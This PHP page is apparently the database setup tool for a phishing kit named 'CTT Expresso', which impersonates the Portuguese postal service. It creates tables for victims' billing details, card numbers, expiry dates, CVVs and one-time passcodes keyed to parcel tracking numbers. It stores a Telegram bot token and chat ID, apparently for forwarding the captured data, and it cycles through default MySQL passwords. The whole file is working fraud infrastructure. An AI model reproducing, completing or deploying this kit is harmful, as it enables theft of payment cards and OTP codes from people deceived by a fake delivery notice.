<?php
// Windows RDP XAMPP Setup Tool
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html>
<head>
    <title>CTT Expresso - Windows RDP Setup</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #f0f2f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .success { color: #28a745; font-weight: bold; }
        .error { color: #dc3545; font-weight: bold; }
        .warning { color: #ffc107; font-weight: bold; }
        .info { color: #17a2b8; }
        .step { margin: 20px 0; padding: 15px; background: #f8f9fa; border-left: 5px solid #007bff; border-radius: 5px; }
        .cmd { background: #2d3748; color: #e2e8f0; padding: 10px; border-radius: 5px; font-family: 'Courier New', monospace; }
        button { padding: 12px 24px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        .check-item { margin: 10px 0; padding: 10px; background: white; border-radius: 5px; border: 1px solid #dee2e6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖥️ CTT Expresso - Windows RDP Setup</h1>
        <p><strong>Setting up CTT application on Windows Remote Desktop</strong></p>
        
        <div class="step">
            <h2>📋 Pre-Setup Check</h2>
            <div class="check-item">
                <strong>Operating System:</strong> <?php echo php_uname('s') . ' ' . php_uname('r'); ?><br>
                <strong>PHP Version:</strong> <?php echo phpversion(); ?><br>
                <strong>Web Server:</strong> <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?><br>
                <strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown'; ?>
            </div>
        </div>
        
        <div class="step">
            <h2>🔧 XAMPP Service Status</h2>
            <div class="check-item">
                <?php
                // Check if we can connect to MySQL
                $mysqlRunning = false;
                $apacheRunning = isset($_SERVER['HTTP_HOST']);
                
                try {
                    $pdo = new PDO("mysql:host=localhost;port=3306", "root", "", [
                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                        PDO::ATTR_TIMEOUT => 5
                    ]);
                    $mysqlRunning = true;
                } catch (Exception $e) {
                    // Try alternative configurations
                    $altConfigs = [
                        ['root', 'root'],
                        ['root', ''],
                        ['mysql', ''],
                        ['admin', 'admin']
                    ];
                    
                    foreach ($altConfigs as $config) {
                        try {
                            $pdo = new PDO("mysql:host=localhost;port=3306", $config[0], $config[1], [
                                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                                PDO::ATTR_TIMEOUT => 5
                            ]);
                            $mysqlRunning = true;
                            break;
                        } catch (Exception $e2) {
                            continue;
                        }
                    }
                }
                
                echo '<strong>Apache:</strong> ' . ($apacheRunning ? '<span class="success">✅ RUNNING</span>' : '<span class="error">❌ NOT RUNNING</span>') . '<br>';
                echo '<strong>MySQL:</strong> ' . ($mysqlRunning ? '<span class="success">✅ RUNNING</span>' : '<span class="error">❌ NOT RUNNING</span>') . '<br>';
                
                if (!$mysqlRunning) {
                    echo '<div class="warning">⚠️ MySQL not running. Please start XAMPP MySQL service first!</div>';
                }
                ?>
            </div>
        </div>
        
        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['setup'])): ?>
        
        <div class="step">
            <h2>🚀 Running Database Setup...</h2>
            <?php
            $success = false;
            
            // Try different MySQL configurations for Windows
            $configs = [
                ['host' => 'localhost', 'user' => 'root', 'pass' => '', 'port' => '3306', 'name' => 'XAMPP Default'],
                ['host' => '127.0.0.1', 'user' => 'root', 'pass' => '', 'port' => '3306', 'name' => 'XAMPP Alt'],
                ['host' => 'localhost', 'user' => 'root', 'pass' => 'root', 'port' => '3306', 'name' => 'Custom Root'],
            ];
            
            foreach ($configs as $config) {
                echo "<div class='check-item'>";
                echo "<strong>Testing {$config['name']}...</strong><br>";
                
                try {
                    // Connect to MySQL
                    $dsn = "mysql:host={$config['host']};port={$config['port']};charset=utf8mb4";
                    $pdo = new PDO($dsn, $config['user'], $config['pass'], [
                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                        PDO::ATTR_TIMEOUT => 10
                    ]);
                    
                    echo "<span class='info'>✓ Connected to MySQL server</span><br>";
                    
                    // Create database
                    $pdo->exec("CREATE DATABASE IF NOT EXISTS ctt_expresso CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
                    echo "<span class='info'>✓ Database 'ctt_expresso' created</span><br>";
                    
                    // Select database
                    $pdo->exec("USE ctt_expresso");
                    
                    // Drop existing tables to ensure clean install
                    $pdo->exec("DROP TABLE IF EXISTS otp_data");
                    $pdo->exec("DROP TABLE IF EXISTS card_data");
                    $pdo->exec("DROP TABLE IF EXISTS billing_data");
                    $pdo->exec("DROP TABLE IF EXISTS config");
                    
                    // Create tables with proper structure
                    $sql = "
                    CREATE TABLE billing_data (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        session_id VARCHAR(20) UNIQUE NOT NULL,
                        nome VARCHAR(255) NOT NULL,
                        email VARCHAR(255) NOT NULL,
                        endereco TEXT NOT NULL,
                        codigo_postal VARCHAR(20) NOT NULL,
                        cidade VARCHAR(100) NOT NULL,
                        telefone VARCHAR(20) NOT NULL,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
                    
                    CREATE TABLE card_data (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        session_id VARCHAR(20) NOT NULL,
                        numero_cartao VARCHAR(20) NOT NULL,
                        data_expiracao VARCHAR(10) NOT NULL,
                        cvv VARCHAR(4) NOT NULL,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        INDEX idx_session (session_id)
                    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
                    
                    CREATE TABLE otp_data (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        session_id VARCHAR(20) NOT NULL,
                        otp_code TEXT NOT NULL,
                        tracking_number VARCHAR(20) NOT NULL,
                        verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        INDEX idx_session (session_id)
                    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
                    
                    CREATE TABLE config (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        config_key VARCHAR(100) UNIQUE NOT NULL,
                        config_value TEXT NOT NULL,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
                    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
                    ";
                    
                    $pdo->exec($sql);
                    echo "<span class='info'>✓ All tables created successfully</span><br>";
                    
                    // Insert Telegram configuration
                    $stmt = $pdo->prepare("INSERT INTO config (config_key, config_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE config_value = VALUES(config_value)");
                    $stmt->execute(['TELEGRAM_BOT_TOKEN', '8482443491:AAE2BLcm95hkizPLXXDVUXenHjamWd2qdws']);
                    $stmt->execute(['TELEGRAM_CHAT_ID', '-1003023517840']);
                    echo "<span class='info'>✓ Telegram configuration inserted</span><br>";
                    
                    // Test insert
                    $testStmt = $pdo->prepare("INSERT INTO billing_data (session_id, nome, email, endereco, codigo_postal, cidade, telefone) VALUES (?, ?, ?, ?, ?, ?, ?)");
                    $testStmt->execute(['TEST001', 'Test User', 'test@example.com', 'Test Address', '1000-100', 'Test City', '+351999999999']);
                    echo "<span class='info'>✓ Test record inserted</span><br>";
                    
                    // Clean up test record
                    $pdo->exec("DELETE FROM billing_data WHERE session_id = 'TEST001'");
                    echo "<span class='info'>✓ Test record cleaned up</span><br>";
                    
                    echo "<span class='success'>✅ SUCCESS with {$config['name']}!</span>";
                    $success = true;
                    break;
                    
                } catch (Exception $e) {
                    echo "<span class='error'>❌ Failed: " . htmlspecialchars($e->getMessage()) . "</span>";
                }
                echo "</div>";
            }
            
            if ($success) {
                echo "<div class='check-item success'>";
                echo "<h3>🎉 Database Setup Complete!</h3>";
                echo "<p><strong>✅ Database: ctt_expresso created</strong></p>";
                echo "<p><strong>✅ All tables: billing_data, card_data, otp_data, config</strong></p>";
                echo "<p><strong>✅ Telegram configuration: installed</strong></p>";
                echo "<p><a href='test-connection.php' style='color: #007bff;'>➤ Test Connection</a> | <a href='billing.php' style='color: #28a745;'>➤ Start Application</a></p>";
                echo "</div>";
            } else {
                echo "<div class='check-item error'>";
                echo "<h3>❌ Setup Failed</h3>";
                echo "<p>Please check XAMPP MySQL service is running.</p>";
                echo "<p>Go to XAMPP Control Panel and make sure MySQL shows 'Running' status.</p>";
                echo "</div>";
            }
            ?>
        </div>
        
        <?php else: ?>
        
        <div class="step">
            <h2>📖 Setup Instructions</h2>
            <ol>
                <li><strong>Open XAMPP Control Panel</strong> (as Administrator if needed)</li>
                <li><strong>Start Apache</strong> - should show "Running" in green</li>
                <li><strong>Start MySQL</strong> - should show "Running" in green</li>
                <li><strong>Wait for both services</strong> to fully start (5-10 seconds)</li>
                <li><strong>Click the button below</strong> to setup the database</li>
            </ol>
        </div>
        
        <div class="step">
            <h2>🎯 What This Will Do</h2>
            <ul>
                <li>✅ Create database: <code>ctt_expresso</code></li>
                <li>✅ Create all required tables with proper indexes</li>
                <li>✅ Insert Telegram bot configuration</li>
                <li>✅ Test database connectivity</li>
                <li>✅ Verify everything is working</li>
            </ul>
            
            <form method="POST" style="margin-top: 20px;">
                <button type="submit" name="setup" style="font-size: 18px; padding: 15px 30px;">
                    🚀 Setup Database for Windows RDP
                </button>
            </form>
        </div>
        
        <?php endif; ?>
        
        <div class="step">
            <h2>🆘 Troubleshooting Windows RDP</h2>
            <div class="check-item">
                <strong>If setup fails:</strong>
                <ul>
                    <li>Check Windows Firewall is not blocking port 3306</li>
                    <li>Verify XAMPP is installed in <code>C:\xampp</code></li>
                    <li>Run XAMPP Control Panel as Administrator</li>
                    <li>Check if port 3306 is already in use by another service</li>
                    <li>Look at MySQL error log: <code>C:\xampp\mysql\data\mysql_error.log</code></li>
                </ul>
                
                <strong>Windows Services Check:</strong>
                <div class="cmd">
                    netstat -an | findstr :3306
                    sc query mysql
                </div>
            </div>
        </div>
    </div>
</body>
</html>